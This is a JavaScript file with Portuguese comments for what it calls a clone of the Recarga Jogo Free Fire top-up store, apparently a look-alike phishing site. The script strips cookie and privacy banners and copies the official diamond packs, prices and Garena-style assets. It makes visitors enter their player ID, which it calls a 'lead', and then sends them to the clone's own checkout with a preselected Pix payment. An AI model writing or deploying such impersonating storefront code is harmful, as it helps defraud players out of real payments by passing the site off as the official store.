// Script de interatividade para o clone do Recarga Jogo
(function() {
  // Remover qualquer banner de cookie remanescente
  function removeCookieBanners() {
    document.querySelectorAll('.fixed').forEach(el => {
      if (el.textContent.includes('Consentimento de Cookie') || el.textContent.includes('Política de Privacidade')) {
        el.remove();
      }
    });
  }
  removeCookieBanners();
  window.addEventListener('DOMContentLoaded', removeCookieBanners);

  // Tabela de Preços e Bônus Oficiais Free Fire
  const PACKS = {
    '310': { base: '310', bonus: '62', price: 'R$ 15,00', label: '310 + 62' },
    '520': { base: '520', bonus: '104', price: 'R$ 20,99', label: '520 + 104' },
    '1.060': { base: '1.060', bonus: '212', price: 'R$ 44,99', label: '1.060 + 212' },
    '1060': { base: '1.060', bonus: '212', price: 'R$ 44,99', label: '1.060 + 212' },
    '2.180': { base: '2.180', bonus: '436', price: 'R$ 87,99', label: '2.180 + 436' },
    '2180': { base: '2.180', bonus: '436', price: 'R$ 87,99', label: '2.180 + 436' },
    '5.600': { base: '5.600', bonus: '1.120', price: 'R$ 209,99', label: '5.600 + 1.120' },
    '5600': { base: '5.600', bonus: '1.120', price: 'R$ 209,99', label: '5.600 + 1.120' },
    '22.400': { base: '22.400', bonus: '4.480', price: 'R$ 839,96', label: '22.400 + 4.480' },
    '22400': { base: '22.400', bonus: '4.480', price: 'R$ 839,96', label: '22.400 + 4.480' },
    'Assinatura Mensal': { base: 'Assinatura Mensal', bonus: 'VIP', price: 'R$ 44,99', label: 'Mensal + VIP' },
    'Passe Booyah Premium Plus': { base: 'Passe Premium Plus', bonus: '50 Níveis', price: 'R$ 44,99', label: 'Passe + 50 Níveis' }
  };

  let currentPack = PACKS['310'];
  let selectedMethod = 'Pix';
  let loggedPlayerId = '';

  // Injetar estilos com tipografia padronizada
  const style = document.createElement('style');
  style.id = 'interactive-styles';
  style.textContent = `
    @keyframes shake-input {
      0%, 100% { transform: translateX(0); }
      20%, 60% { transform: translateX(-8px); }
      40%, 80% { transform: translateX(8px); }
    }
    .shake-error {
      animation: shake-input 0.4s ease-in-out !important;
    }
    /* Espaço para o rodapé */
    body {
      padding-bottom: 96px !important;
    }
    /* Destaque para opções selecionadas */
    [role="radio"][data-headlessui-state~="checked"],
    [role="radio"][aria-checked="true"],
    .clone-radio-checked {
      outline: 2px solid #E53935 !important;
      outline-offset: -2px !important;
      background-color: #FFF5F5 !important;
    }
    .dark [role="radio"][data-headlessui-state~="checked"],
    .dark [role="radio"][aria-checked="true"],
    .dark .clone-radio-checked {
      outline: 2px solid #FF4655 !important;
      outline-offset: -2px !important;
      background-color: #2b1f24 !important;
    }
    [role="radio"], [role="tab"], button, [id^="channel-"] {
      cursor: pointer !important;
      user-select: none;
    }
    [role="tab"][aria-selected="true"],
    .clone-tab-selected {
      background-color: #E53935 !important;
      color: #ffffff !important;
      outline: none !important;
    }
    [role="tab"][aria-selected="false"] {
      background-color: transparent !important;
      outline: 1px solid #d1d5db !important;
      color: inherit !important;
    }
    /* Forçar a mesma fonte sans-serif limpa em toda a barra inferior */
    #clone-botbar,
    #clone-botbar * {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Inter, Helvetica, Arial, sans-serif !important;
      letter-spacing: normal !important;
    }
    #clone-botbar {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      z-index: 50;
      background: #ffffff;
      border-top: 1px solid #e5e7eb;
      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.06);
    }
    .dark #clone-botbar {
      background: #1c1c28;
      border-top-color: #33334d;
      box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.4);
    }
    #clone-botbar-inner {
      width: 100%;
      max-width: 64rem;
      margin: 0 auto;
      padding: 0.65rem 1rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
    }
    @media (min-width: 768px) {
      #clone-botbar-inner {
        justify-content: flex-end;
        gap: 2.5rem;
        padding-left: 2.5rem;
        padding-right: 2.5rem;
      }
    }
    #clone-btn-checkout {
      background-color: #e53935 !important;
      color: #ffffff !important;
      font-weight: 700 !important;
      font-size: 15px !important;
      padding: 0.65rem 1.5rem !important;
      border-radius: 8px !important;
      border: none !important;
      cursor: pointer !important;
      display: inline-flex !important;
      align-items: center !important;
      justify-content: center !important;
      gap: 7px !important;
      white-space: nowrap !important;
      line-height: 1 !important;
      text-decoration: none !important;
      transition: background-color 0.15s, transform 0.1s !important;
    }
    #clone-btn-checkout:hover {
      background-color: #c62828 !important;
    }
    #clone-btn-checkout:active {
      transform: scale(0.98) !important;
    }
  `;
  document.head.appendChild(style);

  // Criar HTML da BotBar com o ícone oficial point.png
  const botBar = document.createElement('div');
  botBar.id = 'clone-botbar';
  botBar.innerHTML = `
    <div id="clone-botbar-inner">
      <div style="display: flex; flex-direction: column; gap: 2px;">
        <div style="display: flex; align-items: center; gap: 7px; flex-wrap: nowrap; white-space: nowrap;">
          <!-- Ícone Oficial do Diamante (point.png) -->
          <img src="/cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante" style="width: 20px; height: 20px; object-fit: contain; flex-shrink: 0;">
          <!-- Texto inteiro na mesma fonte -->
          <span id="botbar-diamonds" style="font-weight: 800; font-size: 18px; color: #0f172a; line-height: 1; white-space: nowrap;" class="dark:text-white">
            310 + 62
          </span>
          <!-- Botão Chevron Up -->
          <button style="border: none; background: #f1f5f9; border-radius: 50%; width: 18px; height: 18px; display: inline-flex; align-items: center; justify-content: center; color: #64748b; padding: 0; cursor: pointer;" class="dark:bg-gray-700 dark:text-gray-300">
            <svg width="10" height="10" viewBox="0 0 18 18" fill="none">
              <path d="M11.25 9.96484L9 7.71484L6.75 9.96484" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </button>
        </div>
        <div style="font-size: 14px; font-weight: 500; color: #64748b; line-height: 1.2;" class="dark:text-gray-300">
          Total: <span id="botbar-price" style="font-weight: 800; color: #e53935; font-size: 16px; margin-left: 2px;">R$ 15,00</span>
        </div>
      </div>
      <button id="clone-btn-checkout">
        <!-- Ícone Oficial de Escudo -->
        <svg style="width: 19px; height: 19px; flex-shrink: 0;" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M54.125 34.1211C55.2966 32.9495 55.2966 31.05 54.125 29.8784C52.9534 28.7069 51.0539 28.7069 49.8823 29.8784L38.0037 41.7571L32.125 35.8784C30.9534 34.7069 29.0539 34.7069 27.8823 35.8784C26.7108 37.05 26.7108 38.9495 27.8823 40.1211L35.8823 48.1211C37.0539 49.2926 38.9534 49.2926 40.125 48.1211L54.125 34.1211Z" fill="currentColor"/>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M43.4187 3.4715C41.2965 2.28554 38.711 2.28554 36.5889 3.4715L8.07673 19.4055C6.19794 20.4555 4.97252 22.4636 5.02506 24.7075C5.36979 39.43 10.1986 63.724 37.0183 76.9041C38.8951 77.8264 41.1125 77.8264 42.9893 76.9041C69.809 63.724 74.6377 39.43 74.9825 24.7075C75.035 22.4636 73.8096 20.4555 71.9308 19.4055L43.4187 3.4715ZM39.5159 8.7091C39.8191 8.53968 40.1885 8.53968 40.4916 8.7091L68.9826 24.6313C68.6493 38.3453 64.2154 59.7875 40.343 71.5192C40.135 71.6214 39.8725 71.6214 39.6646 71.5192C15.7921 59.7875 11.3583 38.3453 11.025 24.6313L39.5159 8.7091Z" fill="currentColor"/>
        </svg>
        <span>Compre agora</span>
      </button>
    </div>
  `;
  document.body.appendChild(botBar);

  function updateBotBar() {
    const diamondsEl = document.getElementById('botbar-diamonds');
    const priceEl = document.getElementById('botbar-price');
    if (diamondsEl) diamondsEl.textContent = currentPack.label;
    if (priceEl) priceEl.textContent = currentPack.price;
  }

  
  // Função para exibir alerta quando o ID do jogador não foi inserido
  function showIdWarning(input) {
    const targetInput = input ||
                        document.querySelector('input[placeholder*="ID de jogador"]') ||
                        document.querySelector('form.mb-4 input') ||
                        document.querySelector('form input[type="text"]') ||
                        document.getElementById(':rj:');

    if (targetInput) {
      targetInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
      targetInput.focus();
      targetInput.style.border = '2px solid #E53935';
      targetInput.style.boxShadow = '0 0 0 4px rgba(229, 57, 53, 0.35)';
      targetInput.classList.remove('shake-error');
      // Forçar reflow para reiniciar animação
      void targetInput.offsetWidth;
      targetInput.classList.add('shake-error');
    }

    let warningEl = document.getElementById('clone-id-alert');
    if (!warningEl) {
      warningEl = document.createElement('div');
      warningEl.id = 'clone-id-alert';
      warningEl.style.cssText = 'background-color:#FEF2F2; border:2px solid #EF4444; color:#B91C1C; padding:12px 16px; border-radius:8px; font-size:14px; font-weight:700; margin-top:10px; display:flex; align-items:center; gap:10px; box-shadow:0 4px 12px rgba(239,68,68,0.18); font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;';
      const form = document.querySelector('form.mb-4') || document.querySelector('form') || (targetInput && targetInput.closest('form'));
      if (form) {
        form.parentNode.insertBefore(warningEl, form.nextSibling);
      }
    }
    if (warningEl) {
      warningEl.innerHTML = '<span style="font-size:18px;">⚠️</span><span>Por favor, <strong>insira o ID de jogador</strong> da sua conta para continuar!</span>';
      warningEl.style.display = 'flex';
      warningEl.classList.remove('shake-error');
      void warningEl.offsetWidth;
      warningEl.classList.add('shake-error');
    }

    showFloatingToast('⚠️ Insira o ID de jogador da sua conta para continuar!');
  }

  function showFloatingToast(msg) {
    let toast = document.getElementById('clone-floating-toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'clone-floating-toast';
      toast.style.cssText = 'position:fixed; bottom:85px; left:50%; transform:translateX(-50%); background:#1f2937; color:#ffffff; padding:10px 20px; border-radius:9999px; font-size:13px; font-weight:600; z-index:100; box-shadow:0 4px 14px rgba(0,0,0,0.3); pointer-events:none; transition:opacity 0.3s ease; text-align:center; white-space:nowrap; border:1px solid #374151;';
      document.body.appendChild(toast);
    }
    toast.textContent = msg;
    toast.style.opacity = '1';
    toast.style.display = 'block';
    clearTimeout(toast._timer);
    toast._timer = setTimeout(() => {
      toast.style.opacity = '0';
      setTimeout(() => { toast.style.display = 'none'; }, 300);
    }, 3500);
  }

  // Interceptar cliques gerais
  document.addEventListener('click', function(e) {
    // 1. Redirecionar para o Checkout Oficial (TRAVA ESTRITA DE ID)
    if (e.target.closest('#clone-btn-checkout')) {
      e.preventDefault();
      e.stopPropagation();

      const idInput = document.querySelector('input[placeholder*="ID de jogador"]') ||
                      document.querySelector('form.mb-4 input') ||
                      document.querySelector('form input[type="text"]') ||
                      document.getElementById(':rj:');

      // Obter valor DIGITADO no input (STRICT - não permite vazio nem espaço)
      const currentId = idInput && idInput.value ? idInput.value.trim() : '';

      // O LEAD SÓ PODE IR PARA O CHECKOUT SE DIGITAR O ID DA CONTA
      if (!currentId || currentId.length < 3) {
        showIdWarning(idInput);
        return false;
      }

      // Salva ID confirmado e prossegue
      localStorage.setItem('logged_player_id', currentId);

      const productName = `${currentPack.label} Diamantes`;
      localStorage.setItem('selected_item', productName);
      localStorage.setItem('selected_price', currentPack.price);
      const url = `/checkout/?item=${encodeURIComponent(productName)}&price=${encodeURIComponent(currentPack.price)}&id=${encodeURIComponent(currentId)}`;
      window.location.href = url;
      return false;
    }

    // 2. Abas ("Comprar" e "Resgatar")
    const tab = e.target.closest('[role="tab"]');
    if (tab) {
      const tablist = tab.closest('[role="tablist"]');
      if (tablist) {
        tablist.querySelectorAll('[role="tab"]').forEach(t => {
          t.setAttribute('aria-selected', 'false');
          t.setAttribute('data-headlessui-state', '');
          t.classList.remove('clone-tab-selected');
        });
        tab.setAttribute('aria-selected', 'true');
        tab.setAttribute('data-headlessui-state', 'selected');
        tab.classList.add('clone-tab-selected');
      }
      return;
    }

    // 3. Seleção de Jogos no Topo
    const gameOption = e.target.closest('.group\\/slide, [id*="game-"]');
    if (gameOption) {
      const carousel = gameOption.parentElement;
      if (carousel) {
        carousel.querySelectorAll('[role="radio"], .clone-radio-checked').forEach(r => {
          r.setAttribute('aria-checked', 'false');
          r.setAttribute('data-headlessui-state', '');
          r.classList.remove('clone-radio-checked');
        });
        const radio = gameOption.querySelector('[role="radio"]') || gameOption;
        radio.setAttribute('aria-checked', 'true');
        radio.setAttribute('data-headlessui-state', 'checked');
        radio.classList.add('clone-radio-checked');
      }
      return;
    }

    // 4. Seleção de Diamantes e Ofertas (Seção 2)
    const denomCard = e.target.closest('#denom-section ~ div [role="radio"]') ||
                     e.target.closest('#denom-section ~ div .relative') ||
                     (e.target.closest('#headlessui-radiogroup-\\:r5\\:') && e.target.closest('.relative'));
    if (denomCard) {
      const section2 = document.querySelector('#headlessui-radiogroup-\\:r5\\:') ||
                       (document.getElementById('denom-section') && document.getElementById('denom-section').nextElementSibling);
      if (section2) {
        section2.querySelectorAll('[role="radio"], .clone-radio-checked').forEach(r => {
          r.setAttribute('aria-checked', 'false');
          r.setAttribute('data-headlessui-state', '');
          r.classList.remove('clone-radio-checked');
        });

        const activeRadio = denomCard.hasAttribute('role') && denomCard.getAttribute('role') === 'radio'
          ? denomCard
          : denomCard.querySelector('[role="radio"]') || denomCard;
        
        activeRadio.setAttribute('aria-checked', 'true');
        activeRadio.setAttribute('data-headlessui-state', 'checked');
        activeRadio.classList.add('clone-radio-checked');

        // Identificar pacote e bônus
        const text = activeRadio.textContent.trim();
        for (const key of Object.keys(PACKS)) {
          if (text.includes(key)) {
            currentPack = PACKS[key];
            break;
          }
        }
        updateBotBar();
      }
      return;
    }

    // 5. Seleção de Método de Pagamento (Seção 3 - Pix)
    const channelCard = e.target.closest('[id^="channel-"]') ||
                        (e.target.closest('#headlessui-radiogroup-\\:r6\\:') && e.target.closest('[role="radio"]'));
    if (channelCard) {
      const section3 = document.querySelector('#headlessui-radiogroup-\\:r6\\:') ||
                       (document.getElementById('channel-section') && document.getElementById('channel-section').parentElement);
      if (section3) {
        section3.querySelectorAll('[role="radio"], .clone-radio-checked').forEach(r => {
          r.setAttribute('aria-checked', 'false');
          r.setAttribute('data-headlessui-state', '');
          r.classList.remove('clone-radio-checked');
        });

        const activeRadio = channelCard.hasAttribute('role') && channelCard.getAttribute('role') === 'radio'
          ? channelCard
          : channelCard.querySelector('[role="radio"]') || channelCard;

        activeRadio.setAttribute('aria-checked', 'true');
        activeRadio.setAttribute('data-headlessui-state', 'checked');
        activeRadio.classList.add('clone-radio-checked');
      }
      return;
    }
  });

  // 6. Formulário de Login (Seção 1)
  const loginForm = document.querySelector('form.mb-4') || document.querySelector('form');
  if (loginForm) {
    const input = loginForm.querySelector('input');
    // Não auto-preenche ID velho de testes se o usuário não digitou
    if (input && !input.value.trim()) {
      localStorage.removeItem('logged_player_id');
    }

    if (input) {
      input.addEventListener('input', function() {
        if (input.value.trim()) {
          input.style.border = '';
          input.style.boxShadow = '';
          const alertEl = document.getElementById('clone-id-alert');
          if (alertEl) alertEl.remove();
          loggedPlayerId = input.value.trim();
          localStorage.setItem('logged_player_id', loggedPlayerId);
        }
      });
    }

    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();
      const submitBtn = loginForm.querySelector('button[type="submit"]');
      if (input && input.value.trim()) {
        loggedPlayerId = input.value.trim();
        localStorage.setItem('logged_player_id', loggedPlayerId);

        const alertEl = document.getElementById('clone-id-alert');
        if (alertEl) alertEl.remove();
        input.style.border = '';
        input.style.boxShadow = '';

        if (submitBtn) {
          submitBtn.textContent = 'Conectado ✓';
          submitBtn.style.backgroundColor = '#16a34a';
          submitBtn.style.borderColor = '#16a34a';
        }
        let feedback = document.getElementById('clone-login-feedback');
        if (!feedback) {
          feedback = document.createElement('div');
          feedback.id = 'clone-login-feedback';
          feedback.style.cssText = 'color:#16a34a; font-size:0.85rem; font-weight:600; margin-top:0.5rem; display:flex; align-items:center; gap:0.25rem; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;';
          loginForm.appendChild(feedback);
        }
        feedback.innerHTML = `✓ ID <strong>${loggedPlayerId}</strong> conectado com sucesso!`;

        const denomSec = document.getElementById('denom-section');
        if (denomSec) {
          denomSec.scrollIntoView({ behavior: 'smooth' });
        }
      } else {
        showIdWarning(input);
      }
    });
  }

  // Verificar se o usuário foi redirecionado do checkout porque faltou o ID
  if (new URLSearchParams(window.location.search).get('need_id')) {
    setTimeout(function() {
      const idInput = document.querySelector('input[placeholder*="ID de jogador"]') ||
                      document.querySelector('form.mb-4 input') ||
                      document.querySelector('form input[type="text"]');
      showIdWarning(idInput);
    }, 300);
  }

  // Ao carregar a página: se o input de ID estiver vazio, NUNCA usar id antigo do localStorage
  const checkInitialId = document.querySelector('input[placeholder*="ID de jogador"]') ||
                         document.querySelector('form.mb-4 input') ||
                         document.querySelector('form input[type="text"]') ||
                         document.getElementById(':rj:');
  if (checkInitialId && !checkInitialId.value.trim()) {
    localStorage.removeItem('logged_player_id');
  }

  // Pré-selecionar 310 Diamantes (R$ 15,00) e Pix
  setTimeout(function() {
    removeCookieBanners();
    const defaultOption = document.querySelector('#headlessui-radiogroup-option-\\:rq\\:') ||
                          document.querySelector('[role="radio"]');
    if (defaultOption) {
      defaultOption.setAttribute('aria-checked', 'true');
      defaultOption.setAttribute('data-headlessui-state', 'checked');
      defaultOption.classList.add('clone-radio-checked');
    }
    const defaultPix = document.querySelector('#headlessui-radiogroup-option-\\:r1g\\:') ||
                       document.querySelector('#channel-211985 [role="radio"]');
    if (defaultPix) {
      defaultPix.setAttribute('aria-checked', 'true');
      defaultPix.setAttribute('data-headlessui-state', 'checked');
      defaultPix.classList.add('clone-radio-checked');
    }
    updateBotBar();
  }, 200);

})();
